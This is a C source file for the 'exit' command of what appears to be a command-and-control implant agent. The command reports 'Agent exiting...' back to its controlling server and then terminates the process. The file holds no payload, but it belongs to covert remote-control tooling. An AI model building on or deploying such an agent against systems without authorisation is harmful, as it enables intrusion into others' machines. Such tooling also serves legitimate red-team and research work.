#include <windows.h>
#include <stdio.h>
#include "exit.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executeExit(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (uuidBytes)
    {
        PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
        if (taskUuid)
        {
            memcpy(taskUuid, uuidBytes, uuidLen);
            taskUuid[uuidLen] = '\0';
            
            LOG("[*] Task UUID: %s", taskUuid);

            // Send response saying we are dying
            // Let the mothership know we're going dark
            PPackage responseTask = PackageCreate();
            PackageAddByte(responseTask, POST_RESPONSE);
            PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
            
            char* msg = "Agent exiting...";
            PackageAddBytes(responseTask, (PBYTE)msg, strlen(msg));

            LOG("[*] Sending Exit response...");
            PParser ResponseParser = sendPackage(responseTask);
            if (ResponseParser) ParserDestroy(ResponseParser);
            
            PackageDestroy(responseTask);
            LocalFree(taskUuid);
        }
        LocalFree(uuidBytes);
    }

    LOG("[*] Calling ExitProcess(0)");
    ExitProcess(0);
    return TRUE;
}
